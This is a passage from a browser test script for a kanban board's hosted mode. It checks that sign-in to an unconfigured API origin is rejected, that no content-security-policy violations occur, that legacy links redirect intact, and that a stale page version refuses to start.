      try { await adapter.signIn({ auth: 'http://localhost:54321', key: 'synthetic', email: 'synthetic@example.test', password: 'synthetic' }); }
      catch (e) { return e.message; }
    }, BOARD);
    assert.match(rejected, /configured API origin/);
    assert.deepEqual(await second.evaluate(() => window.__normalCsp), [], 'off-policy auth is rejected before fetch');
    await second.close(); ok('second origin: strict policy, cross-origin API sign-in/load/edit/archive and zero CSP violations');

    const legacy = await browser.newPage();
    await legacy.goto(`${base}/board/index.html?backend=hosted&api=${encodeURIComponent(base)}&board=${BOARD}#17`);
    await legacy.locator('#hostedSignIn').waitFor();
    assert.equal(new URL(legacy.url()).pathname, '/board/hosted.html'); assert.equal(new URL(legacy.url()).hash, '#17');
    assert.equal(new URL(legacy.url()).searchParams.get('api'), base); await legacy.close();
    ok('legacy hosted links redirect to strict entry with query and hash intact');

    const stale = await browser.newPage();
    await stale.addInitScript(() => sessionStorage.setItem('kb_markup_reload', String(Date.now())));
    await stale.route('**/board/hosted.html*', async route => route.fulfill({ contentType: 'text/html', body: fs.readFileSync(path.join(ROOT, 'board/hosted.html'), 'utf8').replace(/data-kb-markup="\d+"/, 'data-kb-markup="999"') }));
    await stale.goto(`${base}/board/hosted.html?api=${encodeURIComponent(base)}`);
    await stale.locator('#kbStale').waitFor(); assert.equal(await stale.locator('#hostedSignIn').count(), 0);
    await stale.close(); ok('hosted markup mismatch refuses application initialisation');
    console.log(`${passed} hosted browser checks passed`);
  } finally { await browser.close(); await new Promise(resolve => server.close(resolve)); }
})().catch(e => { console.error(e); process.exitCode = 1; server.close(); });
